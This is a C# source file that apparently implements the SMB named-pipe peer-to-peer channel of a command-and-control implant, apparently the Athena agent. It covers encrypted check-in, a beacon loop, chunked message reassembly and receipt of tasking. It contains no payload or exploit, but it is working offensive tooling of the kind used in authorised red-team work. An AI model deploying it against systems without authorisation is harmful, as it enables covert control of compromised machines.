using Agent.Interfaces;
using Agent.Utilities;
using System.Text.Json;
using Agent.Models;
using Agent.Profiles.Smb;
using System.Collections.Concurrent;
using System.Text;

using H.Pipes;
using H.Pipes.AccessControl;
using H.Pipes.Args;

namespace Agent.Profiles
{
    public class SmbProfile : IProfile
    {
        private IAgentConfig agentConfig { get; set; }
        private ICryptoManager crypt { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private string pipeName;
        private const int MaxPartialMessages = 128;
        private const int MaxCompletedMessages = 128;
        private const int MaxPartialMessageBytes = 1_048_576;
        private static readonly TimeSpan PartialMessageMaxAge = TimeSpan.FromMinutes(5);
        private static readonly TimeSpan CompletedMessageMaxAge = TimeSpan.FromMinutes(5);
        private readonly object partialMessagesLock = new();
        private ConcurrentDictionary<string, PartialMessage> partialMessages = new();
        private Dictionary<string, DateTimeOffset> completedMessages = new();
        private PipeServer<SmbMessage> serverPipe { get; set; }
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private static readonly TimeSpan CheckinResponseTimeout = TimeSpan.FromSeconds(30);
        private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
        public event EventHandler<MessageReceivedArgs> SetMessageReceived;
        private CheckinResponse cir;

        private bool checkedin = false;
        private bool connected = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;
        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public SmbProfile(IAgentConfig config, ICryptoManager crypto, ILogger logger, IMessageManager messageManager)
        {
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;
            SmbChannelOptions? opts = null;
            try
            {
                opts = JsonSerializer.Deserialize(
                    ChannelConfig.Decode(),
                    SmbChannelOptionsJsonContext.Default.SmbChannelOptions);
            }
            catch (Exception ex)
            {
                this.logger.Log($"Failed to deserialize SMB channel options: {ex.Message}");
            }
            opts ??= new SmbChannelOptions();
            this.pipeName = opts.PipeName ?? "athena";

            this.serverPipe = new PipeServer<SmbMessage>(this.pipeName);

            this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
            this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
            this.serverPipe.MessageReceived += async (sender, args) => await OnMessageReceive(args);
            this.serverPipe.StartAsync(this.cancellationTokenSource.Token);
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

            if (!await CheckinResponseWait.WaitAsync(checkinAvailable, CheckinResponseTimeout, cancellationTokenSource.Token))
            {
                return new CheckinResponse { status = "failed" };
            }

            this.checkedin = true;
            return this.cir;
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                //Check if we have something to send.
                if (!this.messageManager.HasResponses())
                {
                    try
                    {
                        await Task.Delay(100, cancellationTokenSource.Token);
                    }
                    catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
                    {
                        break;
                    }
                    continue;
                }

                try
                {
                    bool delivered = await messageManager.DeliverAsync(
                        this.Send,
                        result => result);
                    this.currentAttempt = delivered ? 0 : this.currentAttempt + 1;
                }
                catch (Exception)
                {
                    this.currentAttempt++;
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    this.cancellationTokenSource.Cancel();
                }
            }
        }

        internal async Task<bool> Send(string json)
        {
            if (!connected)
            {
                SmbConnectionWait.Wait(onClientConnectedSignal, cancellationTokenSource.Token);
            }

            try
            {
                json = this.crypt.Encrypt(json);
                SmbMessage sm = new SmbMessage()
                {
                    guid = Guid.NewGuid().ToString(),
                    final = false,
                    message_type = "chunked_message",
                    agent_guid = agentConfig.uuid,
                };

                string[] parts = json.SplitByLength(4000).ToArray();

                for (int index = 0; index < parts.Length; index++)
                {
                    sm.delegate_message = parts[index];
                    sm.final = index == parts.Length - 1;
                    await this.serverPipe.WriteAsync(sm);
                }
            }
            catch (Exception ex)
            {
                this.connected = false;
                this.logger.Log($"SMB pipe write error: {ex.Message}");
                return false;
            }

            return true;
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        private async Task SendSuccess()
        {
            //Indicate the server that we're done processing the message and it can send the next one (if it's there)
            SmbMessage sm = new SmbMessage()
            {
                guid = Guid.NewGuid().ToString(),
                message_type = "success",
                final = true,
                delegate_message = string.Empty,
                agent_guid = agentConfig.uuid,
            };

            await this.serverPipe.WriteAsync(sm);
        }

        private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
        {
            //Event handler for new messages
            try
            {
                if (args.Message.message_type == "success")
                {
                    return;
                }

                if (TryAccumulateMessage(args.Message, DateTimeOffset.UtcNow, out string completeMessage))
                {
                    await OnMessageReceiveComplete(completeMessage);
                }

                await this.SendSuccess();
            }
            catch (Exception)
            {
            }
        }

        private async Task OnClientConnection()
        {
            onClientConnectedSignal.Set();
            this.connected = true;
            await this.SendSuccess();
        }

        private Task OnClientDisconnect()
        {
            this.connected = false;
            onClientConnectedSignal.Reset();
            lock (partialMessagesLock)
            {
                this.partialMessages.Clear();
            }
            return Task.CompletedTask;
        }

        private bool TryAccumulateMessage(SmbMessage message, DateTimeOffset now, out string completeMessage)
        {
            completeMessage = string.Empty;
            if (string.IsNullOrWhiteSpace(message.guid) || message.delegate_message is null)
            {
                return false;
            }

            lock (partialMessagesLock)
            {
                PruneExpiredMessages(now);
                if (completedMessages.ContainsKey(message.guid))
                {
                    return false;
                }

                PartialMessage partial = GetOrCreatePartialMessage(message.guid, now);
                int incomingBytes = Encoding.UTF8.GetByteCount(message.delegate_message);
                if (!TryEnsurePartialCapacity(message.guid, incomingBytes))
                {
                    return false;
                }

                partial.Content.Append(message.delegate_message);
                partial.ByteCount += incomingBytes;
                partial.UpdatedAt = now;
                if (!message.final)
                {
                    return false;
                }

                partialMessages.TryRemove(message.guid, out _);
                if (completedMessages.Count >= MaxCompletedMessages)
                {
                    return false;
                }

                completeMessage = partial.Content.ToString();
                completedMessages[message.guid] = now.Add(CompletedMessageMaxAge);
                return true;
            }
        }

        private void PruneExpiredMessages(DateTimeOffset now)
        {
            foreach (var stale in partialMessages.Where(entry => now - entry.Value.UpdatedAt > PartialMessageMaxAge).ToArray())
            {
                partialMessages.TryRemove(stale.Key, out _);
            }
            foreach (string completed in completedMessages.Where(entry => entry.Value <= now).Select(entry => entry.Key).ToArray())
            {
                completedMessages.Remove(completed);
            }
        }

        private PartialMessage GetOrCreatePartialMessage(string guid, DateTimeOffset now)
        {
            if (partialMessages.TryGetValue(guid, out PartialMessage? partial))
            {
                return partial;
            }

            while (partialMessages.Count >= MaxPartialMessages)
            {
                RemoveOldestPartialMessage();
            }

            partial = new PartialMessage(now);
            partialMessages[guid] = partial;
            return partial;
        }

        private bool TryEnsurePartialCapacity(string guid, int incomingBytes)
        {
            int totalBytes = partialMessages.Values.Sum(entry => entry.ByteCount);
            while (totalBytes + incomingBytes > MaxPartialMessageBytes && partialMessages.Count > 1)
            {
                totalBytes -= RemoveOldestPartialMessage(guid);
            }

            if (totalBytes + incomingBytes <= MaxPartialMessageBytes)
            {
                return true;
            }

            partialMessages.TryRemove(guid, out _);
            return false;
        }

        private int RemoveOldestPartialMessage(string? except = null)
        {
            var oldest = partialMessages
                .Where(entry => entry.Key != except)
                .OrderBy(entry => entry.Value.UpdatedAt)
                .ThenBy(entry => entry.Key, StringComparer.Ordinal)
                .FirstOrDefault();
            if (string.IsNullOrEmpty(oldest.Key))
            {
                return 0;
            }
            partialMessages.TryRemove(oldest.Key, out PartialMessage? removed);
            return removed?.ByteCount ?? 0;
        }

        private Task OnMessageReceiveComplete(string message)
        {
            try
            {
                string plaintext = this.crypt.Decrypt(message);
                if (!checkedin)
                {
                    CheckinResponse? response = JsonSerializer.Deserialize(plaintext, CheckinResponseJsonContext.Default.CheckinResponse);
                    if (!CheckinResponseValidation.IsSuccessful(response))
                    {
                        return Task.CompletedTask;
                    }

                    cir = response;
                    checkinAvailable.Set();
                    return Task.CompletedTask;
                }

                //If we make it to here, it's a tasking response
                GetTaskingResponse? gtr = JsonSerializer.Deserialize(plaintext, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                if (gtr?.action == "get_tasking")
                {
                    this.SetTaskingReceived?.Invoke(this, new TaskingReceivedArgs(gtr));
                }
            }
            catch
            {
                // Peer-controlled ciphertext and JSON must not escape the receive callback.
            }
            return Task.CompletedTask;
        }

        private sealed class PartialMessage
        {
            public StringBuilder Content { get; } = new();
            public int ByteCount { get; set; }
            public DateTimeOffset UpdatedAt { get; set; }

            public PartialMessage(DateTimeOffset updatedAt)
            {
                UpdatedAt = updatedAt;
            }
        }
    }
}
